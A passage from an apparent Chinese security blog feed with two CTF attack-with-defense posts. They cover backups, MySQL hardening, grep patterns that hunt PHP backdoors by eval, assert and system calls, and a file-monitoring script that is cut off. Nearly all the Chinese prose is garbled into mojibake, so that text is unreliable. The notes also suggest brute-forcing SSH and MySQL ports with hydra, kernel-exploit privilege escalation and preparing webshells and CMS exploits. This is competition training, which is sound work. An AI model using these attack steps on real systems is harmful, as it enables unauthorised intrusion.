çœŸå®çš„ç½‘ç»œæ”»å‡»æµé‡çš„å¯¹æŠ—ä¸é˜²å¾¡ã€‚</p><p>ï¼ˆ3ï¼‰å®Œå–„ç«æŠ€æ¨¡å¼çš„å…·ä½“ç»†èŠ‚ï¼Œå°½é‡é¿å…å–å·§æˆ–è€…ç²—æš´å§¿åŠ¿ã€‚æ¯”å¦‚æ‹¿ä¿®è¡¥æ¼æ´ä¸¾ä¾‹å­ï¼Œç°åœ¨CTFçº¿ä¸‹èµ›ä¸­ç»å¤§éƒ¨åˆ†å‚èµ›è€…ä¸ºäº†ç»´æŒåŠ å›ºè‡ªå·±çš„shellï¼Œå¾€å¾€éƒ½ä¼šé‡‡ç”¨<strong>åˆ é™¤éƒ¨åˆ†é¡µé¢çš„æ–¹æ³•ï¼Œæ¯”å¦‚ç™»é™†ã€æ³¨å†Œé¡µé¢ï¼Œå› ä¸ºé‡‡ç”¨æ­£å¸¸æ‰“è¡¥ä¸ã€ä¿®æ”¹é…ç½®ç­‰æ“ä½œéƒ½æ¯”è¾ƒè´¹æ—¶è´¹äº‹</strong>ã€‚ä½†åœ¨æ¯”èµ›ä¸­è¿™ç§æ–¹å¼æ˜¯å¯¹äºå­¦ä¹ çœŸæ­£çš„å®‰å…¨åŠ å›ºã€æ¼æ´ä¿®è¡¥çŸ¥è¯†æ²¡æœ‰å¤ªå¤šæé«˜ã€‚ç©CTFä¸åº”è¯¥ä»…ä»…ä¸ºäº†æ¯”èµ›è€Œæ¯”èµ›ï¼Œæˆ–è€…åªæ˜¯ä¸ºäº†æ‹¿ä¸ªå¥–ã€æ‹¿å‡ å¼ è¯ä¹¦ï¼Œè¿˜æ˜¯è¦æ³¨é‡ä»ä¸­å­¦åˆ°ç‚¹ä¸œè¥¿ï¼Œä¸è¿‡æœ‰è¯ä¹¦å¯¹ä»¥åå°±ä¸šè¿˜æ˜¯æœ‰äº›å¸®åŠ©çš„ã€‚</p><p>è™½ç„¶è¯´è¿™äº›ä¼šå¢åŠ ä¸¾åŠæ–¹çš„è´Ÿæ‹…ï¼Œç»™é€‰æ‰‹å¢åŠ éš¾åº¦ï¼Œä½†æ˜¯è¿™ä¹Ÿæ˜¯ä¸€ç§è¶‹åŠ¿ã€‚CTFå¿…ç„¶è¦ç»å†ä»æ™®åŠåˆ°æé«˜çš„è½¬å˜ï¼Œå¹¶ä¸”éšç€å‚èµ›é€‰æ‰‹æ°´å¹³çš„æé«˜ï¼Œæˆ‘ä»¬ç¡®å®éœ€è¦ä¸€äº›æ›´æœ‰æ„æ€çš„ç©æ³•ï¼Œè¿™æ˜¯ä¸€ä¸ªç›¸äº’ä¿ƒè¿›çš„å…³ç³»ã€‚å½“ç„¶ï¼Œå¯¹äºå…¥é—¨çº§çš„CTFé€‰æ‰‹æ¥è¯´ï¼Œé¢˜ç›®éš¾åº¦è¿‡å¤§åè€Œä¼šé™ä½æ¯”èµ›ä½“éªŒï¼Œå¯¹äºä¸åŒçº§åˆ«çš„ç©å®¶ï¼Œå¯ä»¥è®¾ç½®ä¸åŒçº§åˆ«çš„èµ›äº‹ã€‚ä»å½¢å¼ä¸Šè®²ï¼Œåƒå¼•å…¥é—¨ç¦ç³»ç»Ÿçªç ´ã€æ— äººæœºæ”»é˜²ç­‰ï¼Œå¯¹äºå¤§éƒ¨åˆ†CTFä¸¾åŠæ–¹æ¥è¯´å®ç°èµ·æ¥æœ‰äº›éš¾åº¦ï¼Œæ¯•ç«Ÿæ¶‰åŠåˆ°ä¸åŒçš„ç¯å¢ƒã€è®¾å¤‡ã€äººå‘˜ç»´æŠ¤ç­‰é—®é¢˜ï¼Œæ‰€ä»¥è¿™ä¸ªä¸åº”è¯¥å¼ºæ±‚ï¼Œä½†æ˜¯å¯¹ç½‘ç»œæ”»é˜²æ¥è¯´å¢åŠ å¦‚windows æœåŠ¡å™¨ã€é‚®ä»¶æœåŠ¡å™¨ã€è·¯ç”±è®¾å¤‡ç­‰è¿˜æ˜¯å¯è¡Œçš„ã€‚ä»¥åçš„CTFè§„æ ¼å’Œæ°´å¹³ä¼šè¶Šæ¥è¶Šé«˜ï¼Œå¯¹äºå‚èµ›é€‰æ‰‹çš„æŒ‘æˆ˜éš¾åº¦ä¹Ÿä¼šè¶Šæ¥è¶Šå¤§ï¼Œè¿™å¯¹äºä¸¾åŠæ–¹å’Œé€‰æ‰‹æ¥è¯´éƒ½æ˜¯æŒ‘æˆ˜ï¼Œä½†æ˜¯æŒ‘æˆ˜äº¦æ˜¯æœºé‡ï¼Œæˆ‘ä»¬åº”æ—¶åˆ»å‡†å¤‡å¥½æŠ•å…¥æˆ˜æ–—ï¼</p><p><strong>å››. æœ€åçš„è¯</strong></p><p>è™½è¯´ä¸Šé¢æåˆ°çš„è¿™äº›å§¿åŠ¿ä¸å¯èƒ½è®©æˆ‘ä»¬çš„é¶æœºå˜å¾—æ— æ‡ˆå¯å‡»ï¼Œä½†æ˜¯è‡³å°‘èƒ½åœ¨æŸç§ç¨‹åº¦ä¸Šæé«˜å®ƒçš„é˜²å¾¡å€¼ï¼Œå¸Œæœ›èƒ½å¯¹å¤§å®¶æœ‰æ‰€å¸®åŠ©ã€‚æœ€åï¼Œç¥æ„¿å„ä½CTFå‚èµ›é€‰æ‰‹åœ¨æ¯”èµ›ä¸­å‹‡åˆ›ä½³ç»©ï¼ŒåŒæ—¶ä¹Ÿç¥æ„¿å„å•ä½çš„å¤§ä½¬ä»¬éƒ½èƒ½æŠŠCTFç­¹åŠçš„è¶Šæ¥è¶Šå¥½ï¼</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CTFçº¿ä¸‹é˜²å¾¡æˆ˜-â€”-è®©ä½ çš„é¶æœºå˜æˆâ€œé“œå¢™é“å£â€&quot;&gt;&lt;a href=&quot;#CTFçº¿ä¸‹é˜²å¾¡æˆ˜-â€”-è®©ä½ çš„é¶æœºå˜æˆâ€œé“œå¢™é“å£â€&quot; class=&quot;headerlink&quot; title=&quot;CTFçº¿ä¸‹é˜²å¾¡æˆ˜ â€” è®©ä½ çš„é¶æœºå˜æˆâ€œé“œå¢™é“å£â€&quot;&gt;&lt;/a&gt;CTFçº¿ä¸‹é˜²å¾¡æˆ˜ â€” è®©ä½ çš„</summary>
      
    
    
    
    <category term="AWD" scheme="https://lhhxs.github.io/categories/AWD/"/>
    
    
    <category term="CTF" scheme="https://lhhxs.github.io/tags/CTF/"/>
    
    <category term="AWD" scheme="https://lhhxs.github.io/tags/AWD/"/>
    
    <category term="æ”»é˜²" scheme="https://lhhxs.github.io/tags/%E6%94%BB%E9%98%B2/"/>
    
  </entry>
  
  <entry>
    <title>CTFçº¿ä¸‹AWDæ”»é˜²æ­¥éª¤æ€»ç»“</title>
    <link href="https://lhhxs.github.io/2022/09/09/ctf%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/CTF%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E6%AD%A5%E9%AA%A4%E6%80%BB%E7%BB%93/"/>
    <id>https://lhhxs.github.io/2022/09/09/ctf%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/CTF%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E6%AD%A5%E9%AA%A4%E6%80%BB%E7%BB%93/</id>
    <published>2022-09-09T02:05:23.134Z</published>
    <updated>2022-09-09T14:24:30.300Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTFçº¿ä¸‹AWDæ”»é˜²æ­¥éª¤æ€»ç»“ï¼š"><a href="#CTFçº¿ä¸‹AWDæ”»é˜²æ­¥éª¤æ€»ç»“ï¼š" class="headerlink" title="CTFçº¿ä¸‹AWDæ”»é˜²æ­¥éª¤æ€»ç»“ï¼š"></a>CTFçº¿ä¸‹AWDæ”»é˜²æ­¥éª¤æ€»ç»“ï¼š</h1><p>ctfçº¿ä¸‹AWDæ”»é˜²èµ›å­¦ä¹ ç¬”è®°ï¼š<a href="https://blog.csdn.net/qq_43442524/article/details/102653414">https://blog.csdn.net/qq_43442524&#x2F;article&#x2F;details&#x2F;102653414</a><br>CTF AWDæ¨¡å¼ä¸‹ç®€å•çš„CMSä»£ç å®¡è®¡ï¼š<a href="https://blog.csdn.net/qq_43442524/article/details/102409351">https://blog.csdn.net/qq_43442524&#x2F;article&#x2F;details&#x2F;102409351</a></p><h2 id="AWDç«èµ›"><a href="#AWDç«èµ›" class="headerlink" title="AWDç«èµ›"></a>AWDç«èµ›</h2><p><img src="https://img-blog.csdn.net/20180920140411443?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTE0OTE4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="image"></p><p>å‰åŠä¸ªå°æ—¶åº”ç†Ÿæ‚‰é…ç½®ç¯å¢ƒã€‚å‡†å¤‡ç½‘çº¿ã€ç½‘çº¿è½¬æ¥å£</p><p>æœ€å¥½çš„é˜²å¾¡å°±æ˜¯æ”»å‡»ï¼Œä¸€å®šè¦åšå¥½å®‰å…¨åŠ å›º</p><p>æœ¬æ¬¡è®°å½•çš„ç›®çš„æ˜¯ä¸ºäº†ç»™è‡ªå·±ä¸€ä¸ªæœˆæ¥çš„å‡†å¤‡å¼„ä¸ªäº¤ä»£,æ„Ÿè§‰è‡ªå·±è·Ÿå¤§ä½¬ä»¬å·®çš„å¾ˆè¿œ,åªæ‹¿äº†ä¸‰ç­‰,å¾€åçš„è·¯è¿˜å¾ˆé•¿,è¿˜æ˜¯éœ€è¦äº¿ç‚¹ç‚¹çš„åŠªåŠ›,æ— é™è¿›æ­¥.</p><p><a href="https://github.com/PlutoaCharon/AWD-Attack-Defense">å·¥å…·é“¾æ¥</a>:</p><p><code>https://github.com/PlutoaCharon/AWD-Attack-Defense</code></p><h2 id="èµ›å‰å‡†å¤‡"><a href="#èµ›å‰å‡†å¤‡" class="headerlink" title="èµ›å‰å‡†å¤‡"></a>èµ›å‰å‡†å¤‡</h2><p>å¸¸ç”¨å·¥å…·ï¼š</p><ul><li>Burpsuite</li><li>sqlmap</li><li>nmapã€masscan</li><li>nc</li><li>Dç›¾</li><li>Xshellã€Xftp</li><li>èœåˆ€æˆ–èšå‰‘</li><li>Chromeã€Firefoxå„ç±»æ’ä»¶</li></ul><p>ä¸€å¥è¯æœ¨é©¬ï¼š</p><ul><li>php</li><li>asp</li><li>aspx</li><li>jsp</li><li>å†…å­˜é©¬</li></ul><p>ä»£ç æ¯”è¾ƒå·¥å…·:</p><p>BeyondCompare(windows)</p><p>Kaleidoscope(mac)</p><p><strong>æå‰å‡†å¤‡å¥½å„ç§cmsçš„poc exp ï¼ˆå› ä¸ºä½ ä»¬ä¸å…è®¸è”ç½‘ï¼‰phpwin phpcms dz</strong></p><p><a href="https://github.com/Mr5m1th/POC-Collect">CMS_POC</a></p><h2 id="é˜²å®ˆæ­¥éª¤"><a href="#é˜²å®ˆæ­¥éª¤" class="headerlink" title="é˜²å®ˆæ­¥éª¤"></a>é˜²å®ˆæ­¥éª¤</h2><h3 id="0x00-sshç™»é™†ï¼Œä¿®æ”¹å¯†ç "><a href="#0x00-sshç™»é™†ï¼Œä¿®æ”¹å¯†ç " class="headerlink" title="0x00 sshç™»é™†ï¼Œä¿®æ”¹å¯†ç "></a>0x00 sshç™»é™†ï¼Œä¿®æ”¹å¯†ç </h3><p>æ™®é€šç”¨æˆ·ææƒæˆrootï¼Œæ ¹æ®kernelç‰ˆæœ¬å·æ‰¾åˆ°å¯¹åº”çš„pocï¼Œexpææƒ</p><h3 id="0x01-ä¸‹è½½æºç ï¼Œå¤‡ä»½ï¼Œ-x2F-var-x2F-www-x2F-html-ç›®å½•"><a href="#0x01-ä¸‹è½½æºç ï¼Œå¤‡ä»½ï¼Œ-x2F-var-x2F-www-x2F-html-ç›®å½•" class="headerlink" title="0x01 ä¸‹è½½æºç ï¼Œå¤‡ä»½ï¼Œ&#x2F;var&#x2F;www&#x2F;html ç›®å½•"></a>0x01 ä¸‹è½½æºç ï¼Œå¤‡ä»½ï¼Œ&#x2F;var&#x2F;www&#x2F;html ç›®å½•</h3><p>å®šæ—¶å¤‡ä»½æºç :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">while [ 1 ]</span><br><span class="line">do</span><br><span class="line">time=`/bin/date +%H-%M-%S`</span><br><span class="line">bak_file=&quot;/var/www/$time.tar.gz&quot;</span><br><span class="line">webdir=&quot;/var/www/html&quot;</span><br><span class="line">tar zcvf $bak_file $webdir &gt;/dev/null 2&gt;&amp;1 &amp;</span><br><span class="line">sleep 60                               //ä¸€åˆ†é’Ÿå¤‡ä»½ä¸€æ¬¡</span><br><span class="line">done </span><br></pre></td></tr></table></figure><h4 id="å¤‡ä»½æ•°æ®åº“"><a href="#å¤‡ä»½æ•°æ®åº“" class="headerlink" title="å¤‡ä»½æ•°æ®åº“"></a>å¤‡ä»½æ•°æ®åº“</h4><p>1ã€æ‰¾æ•°æ®åº“é…ç½®æ–‡ä»¶ï¼Œæ‰¾åˆ°<code>db_nameã€db_user</code>å’Œ<code>db_passwd</code></p><p>2ã€ç™»é™†æ•°æ®åº“ï¼Œå‘½ä»¤å¤‡ä»½æ•°æ®åº“:</p><p><code>mysqldump -u db_user -p db_passwd db_name &gt; bak.sql//å¤‡ä»½æŒ‡å®šæ•°æ®åº“</code></p><p><code>cd /var/lib/mysql</code></p><p><code>mysqldump -u db_user -p db_passwd &gt; bak.sql//å…ˆè¿›å…¥æ•°æ®åº“ç›®å½•å†å¤‡ä»½</code></p><p><code>mysqldump --all-databases &gt; bak.sql //å¤‡ä»½æ‰€æœ‰æ•°æ®åº“</code></p><p>3ã€è¿˜åŸæ•°æ®åº“ï¼š</p><p><code>mysql -u db_user -p db_passwd db_name &lt; bak.sql //è¿˜åŸæŒ‡å®šæ•°æ®åº“</code></p><p><code>cd /var/lib/mysql</code></p><p><code>mysql -u db_user db_passwd &lt; bak.sql //å…ˆè¿›å…¥æ•°æ®åº“ç›®å½•å†è¿˜åŸ</code></p><p>è¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql -u db_name -p</span><br><span class="line">input passwd è¿›å…¥mysqlæ§åˆ¶å°mysql&gt;</span><br><span class="line">mysql&gt; show databases;çœ‹çœ‹æœ‰å“ªäº›æ•°æ®åº“</span><br><span class="line">mysql&gt; create database test ; å»ºç«‹è¦è¿˜åŸçš„æ•°æ®åº“</span><br><span class="line">mysql&gt; use test;åˆ‡æ¢åˆ°åˆšåˆ›å»ºçš„æ•°æ®åº“</span><br><span class="line">mysql&gt; source test.sql; å¯¼å…¥æ•°æ®åº“ </span><br></pre></td></tr></table></figure><p>å…³é—­ MySQL è¿œç¨‹ç™»å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># mysql -u root -p</span><br><span class="line">mysql&gt; use mysql;</span><br><span class="line">mysql&gt; update user set host = &#x27;localhost&#x27; where user=&#x27;root&#x27; and host=&#x27;%&#x27;;</span><br><span class="line">mysql&gt; flush privileges;</span><br><span class="line">mysql&gt; exit; </span><br></pre></td></tr></table></figure><p>éšè—ç”¨æˆ·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æŸ¥çœ‹homeç›®å½•ä¸‹æ˜¯å¦æœ‰å…¶ä»–ç”¨æˆ·</span><br><span class="line">/etc/passwdæ˜¯å¦æœ‰/bin/bashçš„ç”¨æˆ· </span><br></pre></td></tr></table></figure><h3 id="0x02-æ‰«æé¢„ç•™åé—¨ï¼Œå¾¡å‰‘ï¼Œk8é£åˆ€ï¼ŒDç›¾ï¼Œæ‰«æç›®å½•ï¼Œå‘ç°åé—¨ï¼Œæ³¨é‡Šä»£ç "><a href="#0x02-æ‰«æé¢„ç•™åé—¨ï¼Œå¾¡å‰‘ï¼Œk8é£åˆ€ï¼ŒDç›¾ï¼Œæ‰«æç›®å½•ï¼Œå‘ç°åé—¨ï¼Œæ³¨é‡Šä»£ç " class="headerlink" title="0x02 æ‰«æé¢„ç•™åé—¨ï¼Œå¾¡å‰‘ï¼Œk8é£åˆ€ï¼ŒDç›¾ï¼Œæ‰«æç›®å½•ï¼Œå‘ç°åé—¨ï¼Œæ³¨é‡Šä»£ç "></a>0x02 æ‰«æé¢„ç•™åé—¨ï¼Œå¾¡å‰‘ï¼Œk8é£åˆ€ï¼ŒDç›¾ï¼Œæ‰«æç›®å½•ï¼Œå‘ç°åé—¨ï¼Œæ³¨é‡Šä»£ç </h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># ç®€å•çš„æŸ¥æ‰¾åé—¨</span><br><span class="line">find . -name &#x27;*.php&#x27; | xargs grep -n &#x27;eval(&#x27;</span><br><span class="line">find . -name &#x27;*.php&#x27; | xargs grep -n &#x27;assert(&#x27;</span><br><span class="line">find . -name &#x27;*.php&#x27; | xargs grep -n &#x27;system(&#x27; </span><br></pre></td></tr></table></figure><h3 id="0x03-ä¿®æ”¹æ•°æ®åº“å¯†ç "><a href="#0x03-ä¿®æ”¹æ•°æ®åº“å¯†ç " class="headerlink" title="0x03 ä¿®æ”¹æ•°æ®åº“å¯†ç "></a>0x03 ä¿®æ”¹æ•°æ®åº“å¯†ç </h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">Show databases;</span><br><span class="line">use mysql;</span><br><span class="line">set password for root@localhost = password(&#x27;123&#x27;); æˆ–è€…</span><br><span class="line">update user set password = PASSWORD(&#x27;è¦æ›´æ¢çš„å¯†ç &#x27;) where user = &#x27;root&#x27;;</span><br><span class="line">flush privilegesï¼›</span><br><span class="line">show tablesï¼›å¯èƒ½æœ‰flagã€‚</span><br><span class="line">select * from typecho_flag; </span><br></pre></td></tr></table></figure><h3 id="0x04-å…³é—­ä¸å¿…è¦çš„ç«¯å£ï¼Œè¦æ±‚çš„æœåŠ¡ç«¯å£ä¸èƒ½å…³"><a href="#0x04-å…³é—­ä¸å¿…è¦çš„ç«¯å£ï¼Œè¦æ±‚çš„æœåŠ¡ç«¯å£ä¸èƒ½å…³" class="headerlink" title="0x04 å…³é—­ä¸å¿…è¦çš„ç«¯å£ï¼Œè¦æ±‚çš„æœåŠ¡ç«¯å£ä¸èƒ½å…³"></a>0x04 å…³é—­ä¸å¿…è¦çš„ç«¯å£ï¼Œè¦æ±‚çš„æœåŠ¡ç«¯å£ä¸èƒ½å…³</h3><p><code>netstat -napt ï¼Œlsof -i</code> æŸ¥çœ‹ç«¯å£ï¼Œ<br><code>kill -9 PID</code> æ€æ‰è¿›ç¨‹<br><code>nmap -sV ipåœ°å€</code>ï¼ˆ-sVå‚æ•°å¯ä»¥æ¢æµ‹ç›®æ ‡ä¸»æœºçš„æœåŠ¡å™¨ç‰ˆæœ¬ï¼‰<br><code>nmap</code>æ‰«æå¯¹æ–¹å¼€å¯çš„ç«¯å£ï¼Œ21,22ï¼Œ21,3306ï¼Œè¿›è¡Œçˆ†ç ´</p><p><code>msfconsole</code>è¿›å…¥<code>metasploit</code>,<code>hydra</code>å¯ä»¥å¯¹22ç«¯å£è¿›è¡Œçˆ†ç ´</p><h3 id="0x05-ä»£ç å®¡è®¡ï¼Œä½¿ç”¨seayæºä»£ç å®¡è®¡ï¼Œæˆ–è€…Ripsä»£ç å®¡è®¡"><a href="#0x05-ä»£ç å®¡è®¡ï¼Œä½¿ç”¨seayæºä»£ç å®¡è®¡ï¼Œæˆ–è€…Ripsä»£ç å®¡è®¡" class="headerlink" title="0x05 ä»£ç å®¡è®¡ï¼Œä½¿ç”¨seayæºä»£ç å®¡è®¡ï¼Œæˆ–è€…Ripsä»£ç å®¡è®¡"></a>0x05 ä»£ç å®¡è®¡ï¼Œä½¿ç”¨seayæºä»£ç å®¡è®¡ï¼Œæˆ–è€…Ripsä»£ç å®¡è®¡</h3><p>å¯ä»¥å‚è€ƒæˆ‘å†™çš„è¿™ç¯‡åšå®¢</p><p><a href="https://blog.csdn.net/qq_43442524/article/details/101934481">Ripså·¥å…·ä½¿ç”¨</a></p><h3 id="0x06-æœ¨é©¬æŸ¥æ€"><a href="#0x06-æœ¨é©¬æŸ¥æ€" class="headerlink" title="0x06 æœ¨é©¬æŸ¥æ€"></a>0x06 æœ¨é©¬æŸ¥æ€</h3><p>å…³äºæœ¨é©¬</p><ul><li>å…³æ³¨æœåŠ¡çš„å¯ç”¨æ€§çŠ¶å†µ</li><li>æŸ¥çœ‹æ–‡ä»¶ç›‘æ§æƒ…å†µ</li><li>åœ¨è¢«æ”»å‡»çš„æ—¶å€™è¿›è¡Œå“åº”ï¼Œä¿å­˜ç›¸åº”çš„æµé‡ï¼ŒæŸ¥æ‰¾&#x2F;æ¸…é™¤åé—¨</li></ul><blockquote><p>å»ºè®®ä½¿ç”¨apacheç”¨æˆ·æ¥åˆ é™¤</p></blockquote><h4 id="é€šè¿‡æ–‡ä»¶ç›‘æ§æŸ¥çœ‹ç³»ç»Ÿå¼‚å¸¸æƒ…å†µ"><a href="#é€šè¿‡æ–‡ä»¶ç›‘æ§æŸ¥çœ‹ç³»ç»Ÿå¼‚å¸¸æƒ…å†µ" class="headerlink" title="é€šè¿‡æ–‡ä»¶ç›‘æ§æŸ¥çœ‹ç³»ç»Ÿå¼‚å¸¸æƒ…å†µ"></a>é€šè¿‡æ–‡ä»¶ç›‘æ§æŸ¥çœ‹ç³»ç»Ÿå¼‚å¸¸æƒ…å†µ</h4><p>æ–‡ä»¶ç›‘æ§è„šæœ¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">#use: python file_check.py ./</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">import hashlib</span><br><span class="line">import shutil</span><br><span class="line">import ntpath</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">CWD = os.getcwd()</span><br><span class="line">FILE_MD5_DICT = &#123;&#125;      # æ–‡ä»¶MD5å­—å…¸</span><br><span class="line">ORIGIN_FILE_LIST = []</span><br><span class="line"></span><br><span class="line"># ç‰¹æ®Šæ–‡ä»¶è·¯å¾„å­—ç¬¦ä¸²</span><br><span class="line">Special_path_str = &#x27;drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82&#x27;</span><br><span class="line">bakstring = &#x27;bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS&#x27;</span><br><span class="line">logstring = &#x27;log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#x27;</span><br><span class="line">webshellstring = &#x27;webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#x27;</span><br><span class="line">difffile = &#x27;diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN&#x27;</span><br><span class="line"></span><br><span class="line">Special_string = &#x27;drops_log&#x27;  # å…æ­»é‡‘ç‰Œ</span><br><span class="line">UNICODE_ENCODING = &quot;utf-8&quot;</span><br><span class="line">INVALID_UNICODE_CHAR_FORMAT = r&quot;\?%02x&quot;</span><br><span class="line"></span><br><span class="line"># æ–‡ä»¶è·¯å¾„å­—å…¸</span><br><span class="line">spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))</span><br><span class="line">Special_path = &#123;</span><br><span class="line">    &#x27;bak&#x27; : os.path.realpath(os.path.join(spec_base_path, bakstring)),</span><br><span class="line">    &#x27;log&#x27; : os.path.realpath(os.path.join(spec_base_path, logstring)),</span><br><span class="line">    &#x27;webshell&#x27; : os.path.realpath(os.path.join(spec_base_path, webshellstring)),</span><br><span class="line">    &#x27;difffile&#x27; : os.path.realpath(os.path.join(spec_base_path, difffile)),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def isListLike(value):</span><br><span class="line">    return isinstance(value, (list, tuple, set))</span><br><span class="line"></span><br><span class="line"># è·å–Unicodeç¼–ç </span><br><span class="line">def getUnicode(value, encoding=None, noneToNull=False):</span><br><span class="line"></span><br><span class="line">    if noneToNull and value is None:</span><br><span class="line">        return NULL</span><br><span class="line"></span><br><span class="line">    if isListLike(value):</span><br><span class="line">        value = list(getUnicode(_, encoding, noneToNull) for _ in value)</span><br><span class="line">        return value</span><br><span class="line"></span><br><span class="line">    if isinstance(value, unicode):</span><br><span class="line">        return value</span><br><span class="line">    elif isinstance(value, basestring):</span><br><span class="line">        while True:</span><br><span class="line">            try:</span><br><span class="line">                return unicode(value, encoding or UNICODE_ENCODING)</span><br><span class="line">            except UnicodeDecodeError, ex:</span><br><span class="line">                try:</span><br><span class="line">                    return unicode(value, UNICODE_ENCODING)</span><br><span class="line">                except:</span><br><span class="line">                    value = value[:ex.start] + 